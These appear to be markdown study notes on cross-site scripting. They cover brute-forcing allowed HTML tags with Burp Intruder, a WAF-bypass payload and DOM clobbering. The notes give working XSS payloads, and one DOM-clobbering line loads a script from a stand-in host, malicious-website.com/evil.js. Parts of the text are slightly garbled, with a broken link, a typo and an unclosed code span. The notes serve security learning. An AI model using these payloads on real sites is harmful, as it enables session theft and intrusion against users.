

## Tags bruteforcing
- [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
- [portswigger/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

#### steps 
Searching for allowed tags to be inserted in the search field as parameter
1. 'insertpayloadhere' in the field
2. intercept with burp and send to intruder
3. add the tag list to the payload in the intruder settings
4. brute force and look for the 200, we're looking for a tag which allow to have <script> </script>
5. once the tag has been found you need to search for the event eg:onbegin
6. in the search field we will use url encoding: 
```
%3C -> < 
%3E -> >
%20 -> space
%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28%22xss%22%29%3E
```

## Waf bypass with anchor
- [Two solutions for the January 2021 Initigriti XSS Challenge](https://www.youtube.com/watch?v=Wbovgw3Qxxc)
```
onmouseover=alert(document.location.has.substring(1))#payloadhere
```

##  Exploiting DOM clobbering to enable XSS
- [Two solutions for the January 2021 Initigriti XSS Challenge]([https://www.youtube.com/watch?v=Wbovgw3Qxxc](https://youtu.be/Wbovgw3Qxxc?t=912))
- [portswigger/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [portswigger/dom-based/Advanced-dom-clobbering](https://portswigger.net/research/dom-clobbering-strikes-back)
- [HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection)
![](https://i.redd.it/z8hid4itywd91.png)
#### Clobbering definition:
To strike violently and repeatedly; batter or maul. But, In software engineering and Computer science, clobbering a file, Processor register or regions of computer memory is the process of overwriting its contents completely. 
#### Explanation:
~~DOM clobbering is a technique to escalate HTML injection to XSS which has a high impact  DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.~~
DOM Clobbering use the HTMLCollection vulnerability which allow you to add to the HTMLCollection a malicious item with the same id. 
#### Steps:
1. find a form where you can submit some html
2. check in the javascript if there is a ```window.element || something here``` 
3. bypass the sanitization with double anchortag ```<a id=defaultAvatar><<a id=defaultAvatar name=avatar href='cid:"onerror=alert(1)//)"'>
  - ```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```
 
